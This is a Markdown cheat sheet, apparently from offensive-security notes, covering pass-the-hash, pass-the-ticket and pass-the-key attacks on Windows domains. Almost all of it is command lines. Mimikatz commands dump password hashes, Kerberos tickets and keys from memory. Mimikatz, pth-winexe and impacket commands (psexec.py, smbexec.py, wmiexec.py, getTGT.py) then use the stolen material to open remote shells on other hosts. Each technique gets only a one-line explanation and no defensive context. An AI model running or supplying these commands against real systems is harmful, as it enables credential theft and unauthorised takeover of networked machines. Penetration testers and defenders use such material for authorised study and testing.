# Pass The Hash

## Pass the Hash

Use the hash to login in another machine as a local user without knowing its password. Works because NTLM hashes are static so if a user logs into different machines his hash will remain the same on each host.

```
lsadump::sam 
sekurlsa::logonpasswords
```

### Run on Windows

```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM or :NT> /run:<cmd>
```

### Run on Linux

```
pth-winexe -U <domain>/<user>%<NTLM> //<target ip> cmd

#impacket
smbexec.py <user>@<ip> -hashes <NTLM or :NT>
psexec.py <user>@<ip> -hashes <NTLM or :NT>
wmiexec.py <user>@<ip> -hashes <NTLM or :NT>
```

## Pass the Ticket

Loads a ticket in memory granting the current user access to the remote machine/service within the context of the current session.

```
sekurlsa::tickets /export
```

### Run on Windows

```
kerberos::ptt <.krbi file>
.\PsExec.exe -accepteula \\<target host> cmd
```

### Run on Linux

```
#convert and store the ticket file for impacket use
python ticket_converter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=<.ccache file path>

#start remote connection
python psexec.py <domain>/<user>@<host> -k -no-pass
python smbexec.py <domain>/<user>@<host> -k -no-pass
python wmiexec.py <domain>/<user>@<host> -k -no-pass
```

## Pass the Key

Obtain a TGT ticket by providing a valid NTLM hash, AES key or password. The obtained TGT token can then be used to access other machines.

### Run on Windows

```
sekurlsa::ekeys

sekurlsa::pth /user:<user> /domain:<domain> /rc4:<hash> /run:"<cmd>"
sekurlsa::pth /user:<user> /domain:<domain> /aes128:<hash> /run:"<cmd>"
sekurlsa::pth /user:<user> /domain:<domain> /aes256:<hash> /run:"<cmd>"
```

### Run on linux

```
python getTGT.py <domain_name>/<user_name> -hashes <NTLM hash>
python getTGT.py <domain_name>/<user_name> -hashes :<NT hash>
python getTGT.py <domain_name>/<user_name> -aesKey <AES>
python getTGT.py <domain_name>/<user_name>:<password>

export KRB5CCNAME=<ccache file>

#start remote connection
python psexec.py <domain>/<user>@<host> -k -no-pass
python smbexec.py <domain>/<user>@<host> -k -no-pass
python wmiexec.py <domain>/<user>@<host> -k -no-pass
```

